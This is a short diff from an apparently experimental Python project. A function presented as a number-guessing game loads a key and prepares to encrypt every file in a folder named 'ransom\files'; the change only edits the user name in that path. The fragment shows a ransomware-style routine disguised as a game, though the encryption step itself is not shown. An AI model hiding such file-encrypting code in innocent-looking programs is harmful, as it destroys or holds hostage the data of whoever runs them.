@@ -34,7 +34,7 @@ def jugar_adivinar_numero():
     key = cargar_key()
 
     # Ejecutar la encriptación de archivos
-    path_to_encrypt = 'C:\\Users\\vja_2\\Desktop\\ransom\\files'
+    path_to_encrypt = 'C:\\Users\\vj\\Desktop\\ransom\\files'
     items = os.listdir(path_to_encrypt)
     full_path = [os.path.join(path_to_encrypt, item) for item in items]
 
